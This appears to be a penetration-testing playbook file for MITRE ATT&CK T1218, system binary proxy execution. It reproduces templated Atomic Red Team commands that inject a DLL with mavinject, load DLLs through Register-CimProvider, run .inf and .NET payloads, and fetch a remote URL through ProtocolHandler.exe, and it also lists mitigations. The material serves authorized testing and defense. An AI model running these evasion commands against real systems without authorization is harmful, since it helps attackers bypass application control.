---
name: "T1218_system-binary-proxy-execution"
description: "Adversaries may bypass process and/or signature-based defenses by proxying execution of malicious content with signed, or otherwise trusted, binaries."
category: "configuration"
version: "18.1"
author: "cyberstrike-official"
tags:
  - mitre-attack
  - enterprise
  - t1218
  - defense-evasion
  - windows
  - linux
  - macos
technique_id: "T1218"
tactic: "defense-evasion"
all_tactics:
  - defense-evasion
platforms:
  - Windows
  - Linux
  - macOS
mitre_url: "https://attack.mitre.org/techniques/T1218"
tech_stack:
  - windows
  - linux
  - macos
cwe_ids:
  - CWE-693
chains_with:
  - T1218.001
  - T1218.002
  - T1218.003
  - T1218.004
  - T1218.005
  - T1218.007
  - T1218.008
  - T1218.009
  - T1218.010
  - T1218.011
  - T1218.012
  - T1218.013
  - T1218.014
  - T1218.015
prerequisites: []
severity_boost:
  T1218.001: "Chain with T1218.001 for deeper attack path"
  T1218.002: "Chain with T1218.002 for deeper attack path"
  T1218.003: "Chain with T1218.003 for deeper attack path"
---

# T1218 System Binary Proxy Execution

## High-Level Description

Adversaries may bypass process and/or signature-based defenses by proxying execution of malicious content with signed, or otherwise trusted, binaries. Binaries used in this technique are often Microsoft-signed files, indicating that they have been either downloaded from Microsoft or are already native in the operating system. Binaries signed with trusted digital certificates can typically execute on Windows systems protected by digital signature validation. Several Microsoft signed binaries that are default on Windows installations can be used to proxy execution of other files or commands.

Similarly, on Linux systems adversaries may abuse trusted binaries such as <code>split</code> to proxy execution of malicious commands.

## Kill Chain Phase

- Defense Evasion (TA0005)

**Platforms:** Windows, Linux, macOS

## What to Check

- [ ] Identify if System Binary Proxy Execution technique is applicable to target environment
- [ ] Check Windows systems for indicators of System Binary Proxy Execution
- [ ] Check Linux systems for indicators of System Binary Proxy Execution
- [ ] Check macOS systems for indicators of System Binary Proxy Execution
- [ ] Verify mitigations are bypassed or absent (6 known mitigations)
- [ ] Assess detection coverage (1 detection strategies)

## How to Test

### Atomic Red Team Tests

The following tests are from [Atomic Red Team](https://github.com/redcanaryco/atomic-red-team) and provide actionable ways to test this technique:

### Atomic Test 1: mavinject - Inject DLL into running process

Injects arbitrary DLL into running process specified by process ID. Requires Windows 10.

**Supported Platforms:** windows
**Elevation Required:** Yes

```cmd
mavinject.exe #{process_id} /INJECTRUNNING "#{dll_payload}"
```

**Dependencies:**

- T1218.dll must exist on disk at specified location (#{dll_payload})

### Atomic Test 2: Register-CimProvider - Execute evil dll

Execute arbitrary dll. Requires at least Windows 8/2012. Also note this dll can be served up via SMB

**Supported Platforms:** windows

```cmd
C:\Windows\SysWow64\Register-CimProvider.exe -Path "#{dll_payload}"
```

**Dependencies:**

- T1218-2.dll must exist on disk at specified location (#{dll_payload})

### Atomic Test 3: InfDefaultInstall.exe .inf Execution

Test execution of a .inf using InfDefaultInstall.exe

Reference: https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Infdefaultinstall.yml

**Supported Platforms:** windows

```cmd
InfDefaultInstall.exe "#{inf_to_execute}"
```

**Dependencies:**

- INF file must exist on disk at specified location (#{inf_to_execute})

### Atomic Test 4: ProtocolHandler.exe Downloaded a Suspicious File

Emulates attack via documents through protocol handler in Microsoft Office. On successful execution you should see Microsoft Word launch a blank file.

**Supported Platforms:** windows

```cmd
FOR /F "tokens=2*" %a in ('reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\Winword.exe" /V PATH') do set microsoft_wordpath=%b
call "%microsoft_wordpath%\protocolhandler.exe" "ms-word:nft|u|#{remote_url}"
```

**Dependencies:**

- Microsoft Word must be installed

### Atomic Test 5: Microsoft.Workflow.Compiler.exe Payload Execution

Emulates attack with Microsoft.Workflow.Compiler.exe running a .Net assembly that launches calc.exe

**Supported Platforms:** windows

```powershell
#{mwcpath}\#{mwcname} "#{xml_payload}" output.txt
```

**Dependencies:**

- .Net must be installed for this test to work correctly.

### Manual Testing

If Atomic Red Team tests are not applicable, manually verify the technique by:

1. **Identify Attack Surface**: Determine if the target environment is susceptible to System Binary Proxy Execution by examining the target platforms (Windows, Linux, macOS).

2. **Assess Existing Defenses**: Review whether mitigations for T1218 are in place. If defenses are absent or misconfigured, this technique may be exploitable.

3. **Execute Test**: Use tools and methods described in the MITRE ATT&CK page and external references below.

## Remediation Guide

### M1050 Exploit Protection

Microsoft's Enhanced Mitigation Experience Toolkit (EMET) Attack Surface Reduction (ASR) feature can be used to block methods of using using trusted binaries to bypass application control.

### M1037 Filter Network Traffic

Use network appliances to filter ingress or egress traffic and perform protocol-based filtering. Configure software on endpoints to filter network traffic.

### M1026 Privileged Account Management

Restrict execution of particularly vulnerable binaries to privileged accounts or groups that need to use it to lessen the opportunities for malicious usage.

### M1038 Execution Prevention

Consider using application control to prevent execution of binaries that are susceptible to abuse and not required for a given system or network.

### M1042 Disable or Remove Feature or Program

Many native binaries may not be necessary within a given environment.

### M1021 Restrict Web-Based Content

Restrict use of certain websites, block downloads/attachments, block Javascript, restrict browser extensions, etc.

## Detection

### Detection of Proxy Execution via Trusted Signed Binaries Across Platforms

## Risk Assessment

| Finding                                            | Severity | Impact          |
| -------------------------------------------------- | -------- | --------------- |
| System Binary Proxy Execution technique applicable | Medium   | Defense Evasion |

## CWE Categories

| CWE ID  | Title                        |
| ------- | ---------------------------- |
| CWE-693 | Protection Mechanism Failure |

## References

- [GTFO split](https://gtfobins.github.io/gtfobins/split/)
- [LOLBAS Project](https://github.com/LOLBAS-Project/LOLBAS#criteria)
- [split man page](https://man7.org/linux/man-pages/man1/split.1.html)
- [Atomic Red Team - T1218](https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1218)
- [MITRE ATT&CK - T1218](https://attack.mitre.org/techniques/T1218)
